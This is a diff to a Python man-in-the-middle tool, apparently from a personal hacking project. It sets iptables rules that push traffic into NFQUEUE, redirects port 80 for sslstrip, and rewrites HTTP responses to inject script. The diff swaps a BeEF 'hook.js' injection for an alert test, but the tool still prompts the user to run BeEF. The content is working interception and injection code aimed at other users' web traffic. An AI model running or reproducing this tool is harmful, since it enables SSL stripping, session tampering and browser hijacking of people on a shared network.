@@ -201,19 +201,20 @@ def set_presets():
     preset = raw_input(
         "To catch for modify: just transient/all&sslstrip/yours traffic (t/as/y or whatever you want for exit): ")
     if "t" == preset:
-        subprocess.call("iptables -A FORWARD -j NFQUEUE --queue-num 0", shell=True)
-    elif "y" or "as" == preset:
-        subprocess.call("iptables -A INPUT -j NFQUEUE --queue-num 0", shell=True)
-        subprocess.call("iptables -A OUTPUT -j NFQUEUE --queue-num 0", shell=True)
+        subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
+    elif preset in ["y", "as"]:
+        subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
+        subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)
         if "as" == preset:
-            raw_input("===>>> ALERT!!! Make sure you run 'sslstrip' before!!! (press any key to continue)")
-            subprocess.call("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000", shell=True)
+            subprocess.call("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080", shell=True)
+            raw_input("===>>> ALERT!!! Make sure you run 'sslstrip'!!! (press any key to continue)")
     else:
         sys.exit()
     return preset
 
 def flush_presets():
     subprocess.call("iptables --flush", shell=True)
+    subprocess.call("iptables -t nat --flush", shell=True)
 
 def set_load_data(packet, load):
     packet[scapy.Raw].load = load
@@ -222,76 +223,81 @@ def set_load_data(packet, load):
     del packet[scapy.TCP].chksum
     return packet
 
-def dns_callback(packet):
-    # TODO
-    packet.accept()
+# def dns_callback(packet):
+#     # TODO
+#     packet.accept()
+#
+# def download_callback(packet):
+#     # TODO
+#     packet.accept()
+#
+# def get_current_ip(nic):
+#     ifconfig_result = subprocess.check_output(["ifconfig", nic])
+#     ip_address_search_result = re.search(r"(?<=inet\s).*(?=\snetmask)", str(ifconfig_result))
+#     if ip_address_search_result:
+#         return str(ip_address_search_result.group(0))
+#     else:
+#         print("[---] ERROR! Could not read the IP-address")
+#         sys.exit()
+#
+# def hack_src():
+#     return "http://" + CURRENT_IP + "/hook.js:3000"
 
-def download_callback(packet):
-    # TODO
-    packet.accept()
-
-def get_current_ip(nic):
-    ifconfig_result = subprocess.check_output(["ifconfig", nic])
-    ip_address_search_result = re.search(r"(?<=inet\s).*(?=\snetmask)", str(ifconfig_result))
-    if ip_address_search_result:
-        return str(ip_address_search_result.group(0))
-    else:
-        print("[---] ERROR! Could not read the IP-address")
-        sys.exit()
-
-def hack_src():
-    return "http://" + CURRENT_IP + "/hook.js:3000"
+COUNT = 0
 
 def inject_callback(packet):
     scapy_packet = scapy.IP(packet.get_payload())
-    if scapy_packet.haslayer(scapy.Raw):
+    global COUNT
+    COUNT += 1
+    print "\r" + str(COUNT),
+    if scapy_packet.haslayer(scapy.TCP) and scapy_packet.haslayer(scapy.Raw):
         load = scapy_packet[scapy.Raw].load
         if scapy_packet[scapy.TCP].dport == PORT:
-            # print(scapy_packet.show())
-            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
+            load = re.sub("Accept-Encoding:.*?\\r\\n", "", str(load))
+            load = load.replace("HTTP/1.1", "HTTP/1.0")
         elif scapy_packet[scapy.TCP].sport == PORT:
-            # print(scapy_packet.show())
-            injection_code = "<script defer src=" + hack_src() + "></script>"
-            load = load.replace("</head>", injection_code + "</head>")
+            injection_code = "<script>alert('Test');</script>"
+            load = load.replace("</body>", injection_code + "</body>")
             content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
             if content_length_search and "text/html" in load:
                 content_length = content_length_search.group(1)
                 new_content_length = int(content_length) + len(injection_code)
-                content_length_header = "Content-Length: "
-                load = load.replace(content_length_header + content_length, content_length_header + str(new_content_length))
+                load = load.replace(content_length, str(new_content_length))
         if load != scapy_packet[scapy.Raw].load:
             new_packet = set_load_data(scapy_packet, load)
             packet.set_payload(str(new_packet))
     packet.accept()
 
-def callback_switch():
-    opt = raw_input("What do you want? ('d' - dns spoof, 'ds' - download spoof, 'ic' - inject code): ")
-    if "d" == opt:
-        packet = dns_callback
-    elif "ds" == opt:
-        packet = download_callback
-    elif "ic" == opt:
-        raw_input("===>>> ALERT!!! Make sure you run 'BeEF' before!!! (press any key to continue)")
-        packet = inject_callback
-        global CURRENT_IP
-        CURRENT_IP = str(get_current_ip(NIC))
-    return packet
+# def callback_switch():
+#     opt = raw_input("What do you want? ('d' - dns spoof, 'ds' - download spoof, 'ic' - inject code): ")
+#     if "d" == opt:
+#         packet = dns_callback
+#     elif "ds" == opt:
+#         packet = download_callback
+#     elif "ic" == opt:
+#         raw_input("===>>> ALERT!!! Make sure you run 'BeEF' before!!! (press any key to continue)")
+#         packet = inject_callback
+#         global CURRENT_IP
+#         CURRENT_IP = str(get_current_ip(NIC))
+#     return packet
 
 # THE MAIN FUNCTION FOR PACKET MODIFICATION <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 def packet_modificator():
     op = set_presets()
     if "as" == op:
         global PORT
-        PORT = 10000
-    modifier_callback = callback_switch()
-    if not modifier_callback:
-        modifier_callback = callback_switch()
+        PORT = 8080
+    raw_input("===>>> ALERT!!! Make sure you run 'BeEF' before!!! (press any key to continue)")
+    # global CURRENT_IP
+    # CURRENT_IP = str(get_current_ip(NIC))
+    queue = netfilterqueue.NetfilterQueue()
     try:
-        queue = netfilterqueue.NetfilterQueue()
-        queue.bind(0, modifier_callback)
+        queue.bind(0, inject_callback)
+        print("Packet spoofing GO!")
         queue.run()
     except (KeyboardInterrupt, BaseException), e:
         print("WARNING! Something get wrong!... Flushing IP-tables... Please wait...")
+        queue.unbind()
         flush_presets()
         print("IP-tables were flushing successfully!")
 # ================================= /For code_injector ========================================
